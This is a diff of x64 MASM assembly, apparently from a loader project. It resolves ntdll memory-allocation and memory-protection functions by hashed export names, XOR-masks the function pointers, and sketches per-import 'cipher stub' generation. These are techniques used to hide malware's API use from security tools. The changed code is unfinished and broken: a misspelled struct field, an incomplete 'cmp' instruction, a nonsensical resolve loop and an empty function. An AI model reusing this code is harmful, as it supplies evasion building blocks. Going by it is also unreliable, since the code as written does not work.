@@ -277,6 +277,7 @@ dynimp struct                               ; our dynamic import table          
     ntavm   qword ?
     ntpvm   qword ?
     cfw     qword ?                         ; CreateFileW
+    fff     qword ?
     len     dword ?                         ; number of entries                 ;
 dynimp ends                                                                     ;
 
@@ -284,13 +285,14 @@ dynimp ends                                                                     
 ; Function Prototypes
 ;                                                                             
 find_bytes      proto :qword, :qword, :qword, :qword
-genstub         proto :qword
 
+fn_ntavm typedef proto :qword, :qword, :qword, :qword, :dword, :dword
+pntavm   typedef ptr fn_ntavm
 ;                                                                               ;
 ; ----------------------------------------------------------------------------- ;
 ;                               Executable Code                                 ;
 ; ----------------------------------------------------------------------------- ;
-text segment align(16) 'code' read execute ;                                   ;
+text segment align(16) 'code' read execute 
 
 ; ----------------------------------------------------------------------------- ;
 ;                                Entry Point                                    ;
@@ -318,7 +320,18 @@ text segment align(16) 'code' read execute ;                                   ;
 ; the rest.
 ;
 start proc fastcall
-    local   dimp:dynimp
+    call    genimps
+    ret   
+start endp
+
+; Generate a unique cipher stub for the address
+genimps proc 
+    local   pdimp:qword
+    local   buf_size:qword
+
+
+    local   ntavm:qword
+    local   ntpvm:qword
     local   @rbx:qword
     local   @rsi:qword
     local   @rdi:qword
@@ -326,48 +339,69 @@ start proc fastcall
     mov     @rsi, rsi
     mov     @rdi, rdi
     mov     rdi, rcx
+; Get NtAllocate/ProtectVirtualMemory
     sethash rcx, hash_ntdll                 ; encoded hash of `ntdll.dll`       ;
     call    getmod                          ; get module base of ntdll.dll      ;
     mov     rsi, rax                        ; save ntdll base                   ;
     mov     rcx, rax                        ; rcx is the module base            ;
     sethash rdx, hash_ntavm     
-   ;mov     rdx, hash_ntavm                 ; rdx encoded function hash         ;
     call    getexp                          ; resolve address by hash           ;
-    xor     rax, random_mask                ; encode it                         ;
-    mov     [dimp].dynimp.ntavm, rax        ; store in dynamic import table     ;
+    mov     ntavm, rax
     mov     rcx, rsi                        ; reload ntdll base                 ;
     sethash rdx, hash_ntpvm
-   ;mov     rdx, hash_ntpvm                 ; NtProtectVirtualMemory hash       ;
     call    getexp                          ; resolve ntpvm by hash             ;
-    xor     rax, random_mask                ; encode it                         ;
-    mov     [dimp].dynimp.ntpvm, rax        ; store in dynamic import table     ;
-    clobber_regs
-    mov     rbx, @rbx
-    mov     rsi, @rsi                   
-    mov     rdi, @rdi
-    call    genstub
-    ret   
-start endp
+    mov     ntpvm, rax
+; allocate memory for dynamic imports table
+    mov     rbx, ntavm
+    or      rcx, 0xffffffffffffffff
+    lea     rdx, pdimp
+    mov     qword ptr [rdx], 0
+    mov     r8, 7FFFFFFFFh
+    mov     buf_size, max_stub_size
+    lea     r9, buf_size
+    invoke  fn_ntavm ptr ntavm, rcx, rdx, r8, r9, 0x3000, 0x04
+    mov     rbx, pdimp
+; write current values to the dynamic imports table
+    mov     rax, ntavm 
+    xor     rax, random_mask
+    mov     [rbx].dynimp.ntavm, rax
+    mov     rax, ntpvm
+    xor     rax, random_mask
+    mov     [rbx].dynimp.ntpvm, rax
+; resolve kernel32 exports
+    sethash rax, hash_cfw
+    mov     [rbx].dynimp.cfw, rax
+    sethash rax, hash_fff
+    mov     [rbx].dynimp.fff, rax
+    mov     [rbx].dynimp.len, 16
+    xor     eax, eax                        ; rax is the counter
+    mov     rcx, offset dynimp.cfw          ; first hash
+_resolve:
+    mov     rcx, rsi
+    add     rcx, rax
+    cmp     rcx, [rbx].dsynimp.len
+    je      _resolve_done
+    mov     rdx, [rbx+rcx]
+    mov     rcx, rsi
+    call    getexp
 
-; Iterate over imports, resolve pointers, and generate encoding stubs
-genimps proc dimp:qword
+    add     rax, 8
+    cmp     rax
+
+_resolve_done:
+
+
+; clean up values left in volatile registers
+    clobber_regs
+    mov     rdi, @rdi
+    mov     rsi, @rsi
+    mov     rbx, @rbx
     ret
 genimps endp
 
-; Generate a unique cipher stub for the address
-genstub proc dimp:qword
-    local   buf:qword
-; allocate memory for the stub
-    mov     rbx, [dimp].dynimp.ntavm
-    or      rcx, 0xffffffffffffffff
-    lea     rdx, buf
-    xor     r8, r8
-    mov     r9, max_stub_size
-    push    mem_commit or mem_reserve
-    push    page_readwrite
-    xor     rbx, random_mask
-    call    rbx
-    ret
+; Generate a decoding stub
+genstub proc buf:qword, dimp:qword, slot:qword
+
 genstub endp
 
 ; Invoke either a system call export address or raw syscall number from rbx
@@ -539,7 +573,7 @@ _done:                                      ;                                   
     mov     rsi, @rsi
     mov     rbx, @rbx
     retn                                    ;                                   ;
-gethash endp                              
+gethash endp            
 
 ; ----------------------------------------- ;
 ; Find matching bytes in memory
